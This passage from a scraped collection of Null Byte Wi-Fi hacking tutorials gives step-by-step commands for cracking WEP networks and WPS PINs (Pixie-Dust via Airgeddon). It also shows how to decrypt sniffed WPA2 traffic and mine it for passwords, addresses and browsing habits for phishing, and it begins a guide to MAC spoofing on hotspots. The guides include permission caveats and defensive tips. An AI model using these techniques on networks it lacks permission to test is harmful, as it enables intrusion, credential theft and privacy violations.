network and suddenly see an open wireless network with the same name, these are neither a coincidence nor a normal turn of events.\nNever connect to an unknown wireless network pretending to be yours, especially one without encryption. If you suspect your router is actually updating, turn off your Wi-Fi and plug into the router's Ethernet directly to see what the problem is.\nThanks for reading this guide to evil twin AP attacks! If you have any questions or comments, feel free to leave a comment or reach me on Twitter @KodyKinzie. And check out our Wi-Fi hacking series for more guides.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Hunting Down & Cracking WEP Networks",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wi-fi-hunting-down-cracking-wep-networks-0183712/",
        "content": "* WonderHowTo\nWhile the security behind WEP networks was broken in 2005, modern tools have made cracking them incredibly simple. In densely populated areas, WEP networks can be found in surprising and important places to this day, and they can be cracked in a matter of minutes. We'll show you how a hacker would do so and explain why they should be careful to avoid hacking into a honeypot.\nOften one of the first wireless attacks a hacker will learn, WEP networks in your area can be tracked down with only a few software tools and cracked with a network adapter supporting packet injection. While WEP cracking has always been relatively straightforward, the simplicity with which it can be found and broken in 2018 brings it firmly into the abilities of even the most novice of hackers.\nWhile still much more rare to see than open or WPA-encrypted networks, the evolution of tools like Wigle Wifi allows anyone with an Android phone to identify WEP networks for themselves simply by walking or driving by one. Even easier than doing this in person is to simply look at online wardriving databases which clearly show the location of these networks.\nThanks to years of wardriving data, Wigle.net tracks statistics about the type of encryption used with any detected Wi-Fi networks uses. Over time, the percentage of Wi-Fi networks using WEP has dwindled from 45% to a stubborn 7.45 percent.\nWhy WEP Networks Are So Vulnerable\nWEP, or Wired Equivalent Privacy, was implemented in 1995 to provide the same expectation of privacy as on wired networks for users of Wi-Fi but had security problems that came to light shortly after. It was deprecated in 2004, superseded by the WPA and WPA2 encryption that you see today. The reason for this was a series of increasingly devastating attacks against the encryption used in WEP, resulting in the ability to recover the password in a matter of minutes.\nWEP is a stream cipher which relies on never using the same key twice to provide security. Unfortunately, as demonstrated in several published attacks, an attacker is easily able to force the same key to be used twice by replaying network traffic in a way that forces a tremendous amount of packets to be generated. This allows an attacker to collect the data needed to determine the encryption key and crack the network password outright. With good range and a powerful network adapter, anyone can expect to crack WEP networks in only a few minutes.\nThe power behind WEP hacking comes from two different parts of the attack: the ability to stimulate traffic even from a busy network and the ability to crack the network password when collecting a certain amount of that traffic. Remember that with WPA, hackers can't even capture a handshake from an empty network, but even an empty WEP network can be attacked with packet injection.\nWhere WEP Networks Can Be Found\nIn an incident in May of 2006, WEP networks left connected to the credit card processing terminals in TJ Maxx stores allowed a hacker to access the credit card data of millions of customers in one of the biggest ever data breachs. This dramatic example underscored the fact that WEP networks are a critical security risk anywhere they are used.\nToday, WEP serves two major functions in the hacking world: being an easy target and being a trap for script kiddies. Because WEP hacking is often the first criminal hackers learn too, it's often entertaining to set up a honeypot to catch local script kiddies trying to break in. In spite of the popularity of WEP honeypots, you'll find plenty of legitimate vulnerable networks nearby. In general, everyone should treat these as highly suspicious, since it's unlikely that only one person has tried to break into the network.\nDon't Miss: Use the Cowrie SSH Honeypot to Catch Attackers on Your Network\nTo find nearby WEP networks, one can simply go to Wigle.net and sign up for a free account. Next, they would click \"Advanced Search\" and run a search for networks with WEP security near their location. In my example below, I chose to limit my search to only networks I'd seen with my phone personally.\nSearching my personal database for nearby WEP networks found several pages of results.\nIn a dense area, one could simply drive around with the Wigle Wifi Android app, upload the files to Wigle, then run this search. This will reveal the location on a map of every WEP network that was passed. The results can be surprising!\nCaution for Cracking WEP\nAs I previously stated, WEP is extremely simple to crack. Just because it's easy doesn't mean it's legal, so make sure that you have permission to do this to any network you're practicing on before launching this kind of attack. While it's very likely the attack will succeed, and it's good to know this skill, the risk that the network you are attacking is a honeypot is much higher than the average encrypted network. WEP is fundamentally broken, so very few people will choose to use it.\nAnother thing you should consider is that you will very likely not be the first person to crack that WEP network. Depending on the intentions of the person who got there first, the network could be doing anything from stealing credentials to providing a VPN endpoint for very bad stuff. Because you don't know what could be going on, be very cautious about connecting to networks that could be used for nefarious purposes. If WEP is implemented in a business, cracking WEP is often the first line of attack for a pentester to quickly embarrass their client.s\nWhat You'll Need to Get Started\nTo crack a WEP network, you'll need to be able to stimulate enough network traffic to cryptographically attack the key. The best way to do this is to use a wireless network adapter that's capable of packet injection. This means our adapter will be able to send forged packets to our target network, allowing us to replay anything that would cause the router to provide the amount of traffic we need.\nWe've tested several Panda Wireless network adapters like the PAU06 and PAU09, and found them to work well for packet injection with Kali Linux. We have a list of the best compatible network adapters available for Kali in the article linked below if you need some help selecting one.\nYou'll also need a fully updated version of Kali Linux, which you can run as a virtual machine or directly on something like a Raspberry Pi.\nStep 1: Locate Nearby WEP Networks\nTo start attacking a WEP network, you'll need to find one first. To do so, you'll run a series of filters with Airodump-ng to help you locate only vulnerable networks nearby. Airodump-ng is included in the Aircrack-ng package, so be sure to install it with apt-get install aircrack-ng if you don't already.\nDon't Miss: Getting Started with the Aircrack-Ng Suite of Wi-Fi Hacking Tools\nTo get started, type ifconfig to find the name of your wireless network adapter, which you should have plugged in already. In Kali Linux, it should be something like wlan0.\nNext, you'll need to put your attack card into monitor mode. In a terminal window, type sudo airmon-ng start wlan0. This will put your card into monitor mode, likely changing the name of the card as well. Take note of this new name by running ifconfig or ip a again, as you'll need it for the next step.\nNext, run Airodump-ng with the filter --encrypt WEP to see only WEP networks nearby. The complete command can be seen below.\nsudo airodump-ng wlan0mon --encrypt WEP\nThis will scan the area for any packets using WEP encryption, returning the name and information of the network if one exists. Once you have the information, you'll need to use it as a filter to tailor your attack in the next step.\nStep 2: Attack a Discovered WEP Wi-Fi Network\nOnce you have the information you need for targeting the WEP network from Airodump-ng, there are a few variables you'll need to remember. First, take note of the channel number, and second, copy the BSSID (or MAC address) of the network.\nThe next tool you're going to use is a little aggressive, to say the least. Besside-ng will attack all Wi-Fi networks nearby if you don't give it the proper attack parameters to prevent this behavior. The actual attack, however, is highly automated and should proceed until the attack is successful in recovering the WEP network key for as long as you are in the range of the network.\nTo launch the attack, type the following into a terminal window, swapping out the appropriate information.\nbesside-ng -c ChannelTargetIsOn -b BSSIDofTargetNetworkNameOfInterfaceCard\nSo, if your network card was wlan0mon, the BSSID of your target network was 7C:CA:ED:A4:9B:EE, and the target network was on channel 3, your command would look like the following.\nbesside-ng -b 7C:CA:ED:A4:9B:EE -c 11 wlan0mon\nRun this command, and the attack will launch against the network. If your card has trouble or you see \"network is down,\" you can run airmon-ng check kill to kill any processes that may be taking your network adapter out of monitor mode.\nStep 3: Flood the Network & Extract the WEP Key\nWhile the attack proceeds, Besside-ng will log all of the data it collects in a .cap file for later retrieval. If you experience any problems with Besside-ng or get disconnected, don't worry! You can run Aircrack-ng on the .cap file as you add more data generated by Besside-ng, and all of your collected IVs (initialization vectors) will be there. This means you can come back to the same place at different times and gather more IVs to your .cap file until you can crack them to derive the password by running Aircrack-ng.\nTo try to crack the WEP network for the information you've gathered, you'll need to call Aircrack-ng with the location of the .cap file as the argument. This is pretty easy since Besside-ng usually stores WEP.cap in the root folder. That means running the command to try cracking the network is usually as seen below.\naircrack-ng ./wep.cap\nThis will read the .cap file and allow you to select which network you want to crack from the ones Besside-ng has encountered. If you have saved up enough IVs, you can crack the password outright, or you can leave it running while Besside-ng runs, and the attack will be repeated automatically every 5,000 IVs until it succeeds.\nAfter some number crunching, you should see the WEP key cracked in a few seconds to a minute, depending on whether you have gathered enough information.\nProtecting Yourself Against WEP Attacks\nUnless you are trying to catch local script kiddies in the act, there is no reason to use WEP encryption for anything. Aside from being insecure, it also makes your system a very visible target. You should scan for WEP networks in your home and work using Kismet or the Wigle Wifi app, and replace or upgrade any devices that are still using this broken standard of encryption.\nDon't Miss: Null Byte's Guides on Hacking Almost Any Wi-Fi Network\nWEP Encryption Is the Easiest to Crack\nThere you have it, it only takes a few minutes to break into a WEP network using modern tools like Airodump-ng and Besside-ng in conjunction with an appropriate wireless network adapter. Since WEP cracking is a staple of Wi-Fi hacking, I wanted to be sure we covered it in our intro to Wi-Fi hacking series. Hopefully, you have an understanding of what WEP is, why it's vulnerable, and how to go about actually cracking it.\nI hope you enjoyed this guide to hacking WEP Wi-Fi networks! If you have any questions about this tutorial or WEP cracking, feel free to leave a comment or reach me on Twitter @KodyKinzie. We'll be doing more in our Wi-Fi hacking series, so stay tuned.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Hack WPA & WPA2 Wi-Fi Passwords with a Pixie-Dust Attack Using Airgeddon",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wpa-wpa2-wi-fi-passwords-with-pixie-dust-attack-using-airgeddon-0183556/",
        "content": "* WonderHowTo\nDesign flaws in many routers can allow hackers to steal Wi-Fi credentials, even if WPA or WPA2 encryption is used with a strong password. While this tactic used to take up to 8 hours, the newer WPS Pixie-Dust attack can crack networks in seconds. To do this, a modern wireless attack framework called Airgeddon is used to find vulnerable networks, and then Bully is used to crack them.\nWhen attacking a Wi-Fi network, the first and most obvious place for a hacker to look is the type of network encryption. While WEP networks are easy to crack, most easy techniques to crack WPA and WPA2 encrypted Wi-Fi rely on the password being bad or having the processing power to churn through enough results to make brute-forcing a practical approach.\nIn some cases, an access point's encryption is not the weakest point of the network, so it's good to think outside of the box, or, in this case ... focus on the box. Since the source of the Wi-Fi signal is being broadcast from the router's hardware, the device itself would be a great target to attack instead of the encryption. And one weakness many access points have is a feature called Wi-Fi Protected Setup, which we will learn how to exploit in this guide.\nDon't Miss: How to Crack Weak Wi-Fi Passwords in Seconds with Airgeddon on Parrot OS\nIf you forget the password to your access point, Wi-Fi Protected Setup, better known simply as WPS, lets you connect to the network using an 8-digit number printed on the bottom of the router. This is somewhat more convenient than just resetting the router with the button on the back, but also a massive security hole because of the way many routers deal with implementing this feature.\nA WPS PIN on the bottom of a router can be seen here. Image by audioreservoir/Flickr\nWPS PINs have been attacked by two successive generations of attacks, starting with the most basic brute-forcing methods targeting the way some routers split the PIN into two separate halves before checking them. Years later, another attack emerged that remains effective against many routers and greatly reduces the amount of time needed to attack a target.\nReaver: Now Obsolete Against Most Modern Routers\nThe Reaver brute-force attack was a radical new weapon for Wi-Fi hacking when it was presented in 2011. One of the first practical attacks against WPA- and WPA2-encrypted networks, it totally ignored the type of encryption a network used, exploiting poor design choices in the WPS protocol.\nReaver allowed a hacker to sit within range of a network and brute-force the WPS PIN, spilling all the credentials for the router. Worse, the 8-digit-long PIN could be guessed in two separate halves, allowing for the attack to take significantly shorter than working against the full length of the PIN.\nWhile it did require a hacker to be within range of the target Wi-Fi network, it was able to penetrate even WPA and WPA2 networks with strong passwords using an online attack. This is opposed to an offline attack, such as WPA handshake brute-forcing, which does not require you to be connected to the network to succeed. While this was a limitation, the benefit is that there is typically no sign of this kind of attack to the average user.\nThe Reaver attack proved extremely popular, and since 2011, many routers now have protections to detect and shut down a Reaver-type attack. In particular, these attacks have been greatly slowed by rate-limiting, which forces a hacker to wait several seconds before each PIN attack. Many routers will now \"lock\" the WPS setting in response to too many failed PIN attempts. This has led the Reaver attack to be considered deprecated against most modern routers.\nWPS Pixie-Dust Attack: The Better Attack Method\nWhile routers updated some settings to prevent routers from being attacked via brute-force, serious flaws still existed in the way many routers implement encryption. In programming, it's difficult to create truly random numbers, which is required to produce strong encryption. To do this, we use a function that starts with a number called a \"seed,\" which, after being passed into the function, produces a pseudo-random number.\nIf you use a long or varying \"seed\" number, you can get the same result as a number that's actually random, but if you use an easily guessed \"seed,\" or even worse ... the same one repeatedly, you create weak encryption that is easy to break. This is exactly what router manufacturers did, giving rise to Pixie-Dust, the second generation of WPS PIN attacks.\nDon't Miss: How to Hack Wi-Fi Using a WPS Pixie-Dust Attack & Reaver\nA WPS Pixie-Dust attack in progress.\nSince many routers with WPS enabled use known functions to produce random numbers with seed values like \"0\" or the time stamp of the beginning of the WPS transaction, the WPS key exchange has fatal flaws in the way it encrypts messages. This allows the WPS PIN to be cracked in a matter of seconds.\nWhat You'll Need for This Hack\nOur tool of choice for demonstrating a WPS Pixie-Dust attack will be a wireless attack framework called Airgeddon. Integrating many wireless attack tools into a suite well suited for beginners, Airgeddon will allow you to select and configure your wireless card, find and load targeting data from nearby networks, and attack targeted networks — all from the same tool.\nDon't Miss: How to Build a Software-Based Wi-Fi Jammer with Airgeddon\nThe main menu for the Airgeddon Wi-Fi attack framework.\nThere are some trade-offs to using Airgeddon, as the way it passes data between reconnaissance and attack modules requires you to be able to open multiple terminal windows in a GUI desktop environment. If you are using SSH to access your Kali device, you may need to target vulnerable networks using the wash command included in the Reaver tool and pass the data manually to the Bully tool instead.\nSince different wireless network cards work better or worse with Reaver or Bully, Airgeddon lets you pass target data between the two scripts and find the sweet spot for your wireless card, the attack module you are using, and the target you are attacking.\nTo use the Bully module of Airgeddon, you'll need to be running Kali Linux or another supported distro. Make sure your Kali Linux is fully updated before you begin, as you'll need several packages installed for this tool to work.\nYou'll also need a wireless network adapter capable of packet injection and wireless monitor mode. We recommend the Panda PAU09, or you can check out our guide linked below to see other popular wireless network adapters.\nFinally, make sure you have permission from the owner of the network you're testing this tool on before you start. This tool can work very quickly, and if the network is monitored, you will leave evidence in the logs.\nStep 1: Download Airgeddon\nFirst, you'll need to install Airgeddon by cloning the git repository. Open a terminal window, and type the following to clone the repo, change directory to the new folder, and run \"airgeddon.sh\" as a bash script.\ngit clone github.com/v1s1t0r1sh3r3/airgeddon.gitcd airgeddonsudo bash ./airgeddon.sh\nIf it works, you should see an alien loading screen. Don't get too spooked, the script will start soon.\nStep 2: Install Dependencies\nAirgeddon will detect your OS and terminal resolution. Press return to check on all the tools contained in the framework.\nAirgeddon will do a check to see what essential tools are installed. You should try to make sure you have a completely green board before you begin, but in particular, you will need Bully for this attack. To install a missing repo, you have a number of options. The easiest is to follow the format below.\napt-get install (whatever you are missing)\nIf that doesn't work, you can also try using Python pip to install Python modules by typing pip3 install nameofwhatyouaremissing into a terminal window. When all the results are a green \"Ok,\" press return to proceed to the adapter selection.\nStep 3: Select Your Wireless Network Adapter\nIn the next step, Airgeddon will list your network adapters. Select the one you wish to use for the attack by typing the number next to it. You may want to change the MAC address of your adapter with a tool like GNU MAC Changer before doing this.\nDon't Miss: How to Hack Open Hotel, Airplane & Coffee Shop Wi-Fi with MAC Address Spoofing\nIn this case, I am selecting my dual-band 2.4 and 5 GHz network card, which is option 3.\nNext, you will be dropped into the main attack screen. In this case, I will be performing a WPS attack, so I will select option 8 and press return.\nStep 4: Enable Monitor Mode\nNow, you will need to put your card into monitor mode. Rather than the usual airmon-ng commands, simply type the number 2 into the menu, and press return.\nIf all goes well, your card should be put into monitor mode and change its name. Airgeddon will keep track of the changed name, and you will be able to proceed to the targeting menu.\nStep 5: Sweep the Area for Vulnerable Targets\nTo find vulnerable routers, you can now turn your card to the networks in the immediate area by selecting option 4, scan for targets. If you have a dual-band card, you will be asked if you want to scan the 2.4 or 5 GHz spectrum, allowing you to decide what kind of networks to target. Type Y for 5 GHz and N for 2.4 GHz.\nA window should open showing you all of the vulnerable networks. Allow it to stay open for a few scans while your card runs up and down the wireless channels and tries to find new networks. After waiting for about a minute, exit out of the window, or hit Ctrl + C.\nYou should see your Wi-Fi target data loaded into a selector screen, meaning you're ready to load target data into an attack module!\nStep 6: Load Wi-Fi Target Data into the Bully Attack Module\nNow, you should see a screen which contains target data for each vulnerable network you detected. Type the number of the network you want to target to pass the targeting data to Airgeddon, and press return. Next, you will select which attack module will use these values as an argument.\nIn my example, my WPS attack screen is now fully live and ready to fire. My wireless card is in monitor mode, and I have selected a network by BSSID, channel number, ESSID, and other information I pulled from my scan. Now, all I need to do is select an attack module.\nAs you can see below, quite a few are offered. Depending on your wireless card, you will have more luck with either Reaver or Bully. In this guide, we're focusing on Bully, so type 7 to load the target data into the Bully attack module, and press return.\nThe final value you will need to input is the timeout, or how long before the program assumes the attack has failed. For now, set the value to around 55 seconds. Press return, and the attack will begin.\nStep 7: Launch the Attack & Break the WPS PIN\nOnce you start the attack module, a window will open with red text on the screen. If communication is successful, you will see many encrypted transactions like the one in the image below. If you are out of range or the target isn't really vulnerable, you will see failed transactions.\nAs soon as Bully has the needed data to break the PIN, it will pass it to the WPS Pixie-Dust program.\nThis can happen in a matter of seconds or less, but if your connection is weak, it may take as long as a few minutes. You should see the cracked PIN and the Wi-Fi password appear at the bottom of the screen. That's it! You have complete access to the router.\nIf you write down the PIN, you can use the \"custom PIN association\" module to be able to get the new password any time it's changed until the target buys a new router or disables WPS. This also works if you just got the PIN but didn't get the router to dump the Wi-Fi credentials.\nDefending Against WPS-Pixie Based Attacks\nThe best and most obvious solution to pulling the plug on a Pixie-Dust attack is to disable the nebulously useful feature at the heart of the issue — Wi-Fi Protected Setup. You can easily reset your router with the reset button located on virtually all routers, meaning pretty much no one will be sad if you disable the WPS feature. You can do this through the administration page of most routers.\nAnother important piece of information is that older routers may say they have disabled the WPS option when, in fact, they are still vulnerable to this attack even with this setting supposedly \"off.\" This is a serious issue for older hardware, and if you test this tool against an older router with the WPS set to \"off\" and the attack succeeds, your only option may be simply replacing the hardware and buying a new router.\nWPS-Based Attacks Continue to Evolve\nHardware-based attacks are a brilliant way of bypassing a strong password, and sustained interest in this attack vector continues to fuel the cat-and-mouse game between router manufacturers, ISPs, and the hackers trying to break into these devices. Learning the history of Reaver and the evolution to WPS Pixie-Dust-based attacks will keep you on the bleeding edge of Wi-Fi hacking and expand your hacking toolkit to enable you to take on any router with vulnerable WPS enabled.\nI hope you enjoyed this guide to hacking WPS PINs with Airgeddon! If you have any questions about this tutorial or Airgeddon, feel free to leave a comment or reach me on Twitter @KodyKinzie. We'll be doing more in our Wi-Fi hacking series, so stay tuned.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Stealthfully Sniff Wi-Fi Activity Without Connecting to a Target Router",
        "link": "https://null-byte.wonderhowto.com/how-to/stealthfully-sniff-wi-fi-activity-without-connecting-target-router-0183444/",
        "content": "* WonderHowTo\nIdentifying vulnerable devices and services on a target router can be difficult without leaving logs and other traces of an active attacker on the network. However, there is a way to covertly decrypt and view Wi-Fi activity without ever connecting to the wireless network.\nWhen targeting Wi-Fi routers, hackers may try to brute-force WPA2 handshakes or phish for passwords. Once the Wi-Fi credentials have been acquired, they will begin mapping and fingerprinting the compromised network using a variety of techniques.\nPort scanners will create an enormous amount of noise on wireless networks. Man-in-the-middle attacks can be too aggressive and alert users and administrators to the presence of a hacker. Routers keep logs of every device that connects to the network. Every action taken while connected to a network may in some way result in being discovered on the compromised router.\n* Don't Miss: Use Kismet to Watch Wi-Fi User Activity Through Walls\nIt's better not to connect to the Wi-Fi router at all. In this guide, we'll develop an understanding of how attackers capture packets as they transmit to and from the wireless router with Airodump-ng — and decrypt WPA2 traffic in near real time.\nHow the Attack Works\nWireshark is the world's foremost and widely used network analyzer. It allows users to see what's happening on networks at a microscopic level and is the de facto network auditing tool across commercial and non-profit enterprises, government agencies, and educational institutions.\nA great feature built into Wireshark allows attackers to decrypt and view router activity transmitted over the air in plain-text, and that's exactly what we're going to find out in this guide.\nStep 1: Identify the Target Network\nAirodump-ng is available in all popular Linux distributions and will work on virtual machines and on Raspberry Pi installations. I'll be using Kali Linux to collect data belonging to a Wi-Fi router that I control. If you've never used Airdodump-ng before, you can learn some basics in my article on hacking a neighbor with a Post-It note or in our Aircrack-ng overall guide linked below.\nTo enable monitor mode on a wireless adapter, use the below command.\nairmon-ng start wlan0\nThen, find the target network. To view Wi-Fi networks in the surrounding area, use the below command. I'll be targeting my \"Null Byte\" router as an example.\nairodump-ng wlan0mon\nTake note of the BSSID, CH, and ESSID. This information is required to collect data transmitting to the router.\nStep 2: Start Capturing Wi-Fi Data\nTo start collecting data belonging to a target network, type the below command, replacing the parts in italics with what you're working with.\nairodump-ng --bssid TargetMACaddressHere --essid RouterNameHere -c ChannelNumber -w SaveDestination wlan0mon\nI'm saving the collected data into my /tmp directory to a file named \"null_byte\" using the -w argument. Airodump-ng will automatically append a number to the end of the filename, so it'll actually be saved to the /tmp directory as \"null_byte-01.cap.\"\nHere's what to expect from a running Airodump-ng terminal:\nThe most important thing to consider here is the WPA handshake in the top-right corner. A handshake must occur for Wireshark to later decrypt the Wi-Fi traffic. It's possible to use Aireplay-ng to forcefully disconnect devices from the network. Doing this will require devices to reconnect and hopefully produce the WPA handshake in the process, but this may create suspicion among users connected to the network.\nAs long as the Airodump-ng terminal is running, data will continue to accumulate. The Airodump-ng terminal can run for hours or even days. In my example Airodump-ng session, I let the packet collection run for over 15 minutes. The time elapsed can be identified in the top-left corner of the terminal.\nNotice the #Data column in the above screenshot. This number indicates how many data packets have been collected. The higher this number is, the more likely attackers are to discover sensitive information which can be used to pivot or further compromise the target.\nWhen a satisfactory amount of data has been collected, the Airodump-ng session can be stopped by pressing Ctrl + C. There will now be a \"null_byte-01.cap\" file (or whatever you named it) in the /tmp directory. This .cap file will be opened using Wireshark.\nStep 3: Install the Latest Version of Wireshark\nBy default, Wireshark is included in almost all versions of Kali. There are a few versions which don't include Wireshark, so I'll quickly cover how to install it in Kali.\nFirst, run the apt-get update command to ensure the most recently tested and curated (by the Kali developers) version of Wireshark is available for download. Open a terminal, and type the below command.\nsudo apt-get update\nThen, use the following command to install Wireshark.\nsudo apt-get install wireshark\nThe && characters can be used between the two commands as I did in the screenshot above. This will instruct the terminal to first sync the package index with its sources, the Kali repositories. Then — and only if the update is successful — it will install Wireshark.\nStep 4: Start the Wireshark Tool\nWhen that's done, Wireshark can be found in the \"Sniffing & Spoofing\" category in the \"Applications\" menu. To start Wireshark, simply click on the icon.\nStep 5: Configure Wireshark to Decrypt Data\nTo configure Wireshark to decrypt data found in the .cap, click on \"Edit\" button in the top bar, then \"Preferences,\" and expand the \"Protocols\" drop-down menu.\nThen, scroll down and select \"IEEE 802.11.\" The box next to Enable decryption must be checked. Next, click on \"Edit\" to add decryption keys for a particular Wi-Fi network.\nA new window will pop up. This is where the password and router name are to be specified. The credentials should be entered with the password and router name separated by a colon (e.g., password:router_name).\nFirst, select the \"wpa-pwd\" Key type. This key type is required to set the WPA password in plain-text. The password to my \"Null Byte\" Wi-Fi network is a long encoded string, so I entered \"bWN2a25yMmNuM2N6amszbS5vbmlvbg==:Null Byte\" in the Key column. Another example would be \"Wonderfulboat555:NETGEAR72,\" where \"Wonderfulboat555\" is the password to a \"NETGEAR72\" router.\nWhen that's done, click \"OK\" to save the credentials. Wireshark will now automatically decrypt data belonging to the \"Null Byte\" Wi-Fi network when a .cap file is imported.\nStep 6: Perform Deep Packet Inspection (DPI)\nTo import a .cap into Wireshark, click on the \"File\" button in the top bar, then click \"Open.\" The .cap will be found in the /tmp directory; Select it, then click \"Open.\" Depending on how long the Airodump-ng terminal collected data, it could take Wireshark several minutes to import and decrypt all the data.\nAfter opening the .cap in Wireshark, there may be thousands of lines of raw web traffic. This can be intimidating. Fortunately, Wireshark has Display Filters which can be used to manage and filter out packets that aren't useful. There are many display filter cheat sheets online to help Wireshark users find relevant and sensitive data, but I'll cover a few useful display filters below which attackers use to inspect activity taking place on the network.\n1. Find POST Data\nThe HTTP POST request method is often used when uploading a file or submitting usernames and passwords to a website. When someone logs into Facebook or posts a comment at the bottom of this article, it's done using a POST request.\nPOST data in the .cap will most likely hold the most compromising and revealing data. Attackers may find, usernames, passwords, real names, home addresses, email addresses, chat logs, and much more. To filter POST data, enter the below string into the display filter bar.\nhttp.request.method == \"POST\"\nIn my example, I subscribed to a random technology website I found online. It's not unreasonable to believe someone would request email notifications from their favorite news sites.\nIf POST requests were found in the .cap, the Info column will display which lines contain POST data. Double-clicking on one of the lines will produce a new Wireshark window containing more information. Scroll down and expand the \"HTML Form\" drop-down to inspect the data.\nBy inspecting the data collected from this single POST request, a lot of information belonging to someone on the network was discovered.\nCollected data included a first name, last name, and an email address which can later be used for phishing and targeted hacks.\nThere's also a password form required by the website, which can be added to password lists and brute-force attacks. It's not uncommon for people to reuse passwords across multiple accounts. It's certainly possible that password will grant an attacker access to the Gmail address also found in the POST data.\nAlso discovered in the data is a name of a company, presumably where Christopher Hadnagy is employed. This information can be used by an attacker for further social engineering.\nStrolling down the POST data a bit further, there's even more information to be found. A full home address, ZIP code, and phone number is also included in just one POST request. This would inform the attacker of exactly which home the Wi-Fi router belongs to and a phone number which can be used for further social engineering should the hacker decide to send spoofed SMS messages.\n2. Find GET Data\nThe HTTP GET request method is used for fetching or downloading data from web servers. For example, if someone views my Twitter account, their browser would use a GET request to fetch resources from the twitter.com web servers. Inspecting the .cap for GET requests wouldn't reveal usernames or email addresses but it will allow attackers to develop a comprehensive profile of a persons web browsing habits.\nTo filter GET data, enter the below string into the display filter bar.\nhttp.request.method == \"GET\"\nMany websites append .html or .php to the end of the URLs. This can be an indicator of a website viewed by someone on the Wi-Fi network.\nIt might be helpful to filter out CSS and font related GET requests, as these kinds of requests happen silently in the background when we view web pages online. To filter out CSS content, use the below Wireshark filter.\nhttp.request.method == \"GET\" && !(http.request.line matches \"css\")\nThe && here literally means \"and.\" The ! (exclamation point) here means \"not,\" so Wireshark is instructed to display only GET requests and not to display HTTP request lines that match css in any way. This will hopefully filter out some useless information related to benign web resources.\nClicking on one of the lines to investigate and expanding the \"Hypertext Transfer Protocol\" data will provide more identifiable information.\nWe can see the target is using a Windows computer with a Chrome browser user-agent. As far as hardware reconnaissance goes, this information is highly valuable. Attackers can now, with a great degree of certainty, generate a payload for this user specific to the Windows operating system being used.\nThe \"Referer\" tells us what website the target user was viewing immediately before viewing tomsitpro.com. This most likely means they found the \"white hat hacker career\" article via some duckduckgo.com query.\nReferrer's containing DuckDuckGo over Google's search engine might indicate a privacy-conscious user, as Google is known for having invasive policies harmful to its customers. Someone with a concern for privacy might also have an interest in security software like antivirus programs. This is something attackers will consider when generating a targeted payload.\n3. Find DNS Data\nEncrypted internet traffic will transmit over port 443 by default. One might think to use the tcp.port == 443 display filter to better understand what kind of websites are being viewed but that will usually produce raw IP addresses in the destination column which isn't a very convenient way of quickly identifying domains. In fact, a more efficient way of identifying websites sending and receiving encrypted data is by filtering DNS requests.\nThe Domain Name System (DNS) is used to resolve websites names into machine-readable IP addresses like https://104.193.19.59. When we visit a domain such as null-byte.wonderhowto.com, our computer converts the human-readable domain name into an IP address. This happens every time we use a domain name to view websites, send emails, or chat online.\nSearching the .cap for DNS requests will further aid attackers in understanding which websites are frequently visited by people connected to the router. Attackers will also be able to see domain names belonging to websites sending and receiving encrypted data to and from websites like Facebook, Twitter, and Google.\nTo filter DNS data, enter the below string into the display filter bar.\nViewing the DNS requests may provide some interesting information. We can clearly see this user browsing travel websites like expedia.com and kayak.com. This might suggest the user will soon be away from home for an extended period of time.\nThe data is encrypted so attackers can't learn the flight destination or departure information, but using this information to send phishing emails might make it possible for an attacker to social engineer the user into divulging personal and financial information.\nFor example, if DNS requests for a particular banking website were also discovered, attackers could fake an email from that bank and claim a large Expedia credit card transaction just took place. The fake email might also contain accurate information relating to the target with a link to a fake banking website (controlled by the attacker) dedicated to harvesting banking credentials.\nHow to Keep Your Personal Data Safe from Hackers\nAt a glance, all of the personal data discovered in the .cap file might appear harmless or innocuous, but inspecting just a few packets, I learned the target's real name, username, password, email address, home address, phone number, hardware manufacturer, operating system, browser fingerprint, web browsing habits, and more.\nAll of this data was collected without ever connecting to the router. There would be no way for victims to know this was happening to them. All of this data can be used by attackers to launch an elaborate and targeted hack against companies and individuals.\nKeep in mind, all of the personally identifiable information uncovered in this article is also available to internet service providers (ISP) like Verizon and AT&T. Readers should be aware that DPI is performed by ISPs every single day. To protect ourselves from such activity, we can:\n* Use stronger passwords. Brute-forcing weak passwords is an attacker's primary method for gaining access to Wi-Fi routers.\n* Use a Virtual Private Network (VPN). With a secure connection between you and the VPN provider, all of the data uncovered in this article would not have been accessible to an attacker. However, if the VPN provider is logging or performing deep packet inspection, then all of the data would then be easily accessible to them as well.\n* Use Tor. Unlike VPNs, the Tor network is built on a different security model which doesn't relinquish all of our data to one single network or ISP.\n* Use SSL/TLS. Transport Layer Security (HTTPS) will encrypt your web traffic between your browser and the website. Tools like HTTPSEverywhere may help ensure the details of your web browsing traffic are encrypted.\nUntil next time, follow me on Twitter @tokyoneon_ and GitHub. And as always, leave a comment below or message me on Twitter if you have any questions.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Hack Open Hotel, Airplane & Coffee Shop Wi-Fi with MAC Address Spoofing",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-open-hotel-airplane-coffee-shop-wi-fi-with-mac-address-spoofing-0183387/",
        "content": "* WonderHowTo\nAfter finding and monitoring nearby wireless access points and devices connected to them, hackers can use this information to bypass some types of security, like the kind used for Wi-Fi hotspots in coffee shops, hotels, and in flights high above the ground. By swapping their MAC address for that of someone already connected, a hacker can bypass the MAC filter and connect freely.\nPassword-free networks are common in public spaces, allowing anyone to initially join the network without needing to know a secret password. You've likely encountered them at Starbucks, hotel rooms, and on flights featuring in-flight Wi-Fi. All of these networks will have a login portal or payments page users will be continuously redirected to before they can connect directly to the internet.\nHow MAC Addresses Play a Key Role in Connecting\nIn order to connect to one of these public hotspots, or any router, a device's MAC address is needed to assign the device an IP address when attempting to connect, ensuring that any requests the device makes to load content from the internet are returned back to the correct IP (and MAC) address. Routers can allow or prevent devices from accessing the internet based on its MAC address alone.\nThese public wireless networks manage their security by having a secret \"white list\" of MAC addresses belonging to devices which have already gone through the authentication process. These devices have already either accepted the terms of service, paid, or otherwise gone through the process needed to register them with the network's MAC filter, and they are free to access the internet without needing to go through the portal again for a period of time.\nDon't Miss: How to Create an Evil Twin Wireless Access Point to Eavesdrop on Data\nThere currently aren't many ways besides MAC addresses for a 